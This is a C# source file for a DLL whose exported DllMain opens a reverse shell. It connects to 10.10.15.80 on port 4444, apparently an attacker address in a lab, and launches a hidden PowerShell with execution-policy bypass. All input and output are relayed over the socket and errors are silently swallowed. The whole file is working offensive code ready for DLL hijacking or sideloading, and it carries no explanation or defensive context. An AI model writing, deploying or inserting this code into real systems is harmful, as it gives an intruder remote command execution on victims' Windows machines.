using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace RShell_D
{
    internal class Program
    {
        //Needs to be global so that HandleDataReceived can access it
        private static StreamWriter streamWriter;

        [DllExport("DllMain")]
        public static void DllMain()

        {
            try
            {
                // Connect to <IP>  on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect("10.10.15.80", 4444);

                //Set up input/output streams
                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                //Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                //Re-route user-input to STDIN of the PowerShell process
                //If we see the user sent "exit", we can stop
                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (base on user-input exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }
            private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
     }
}

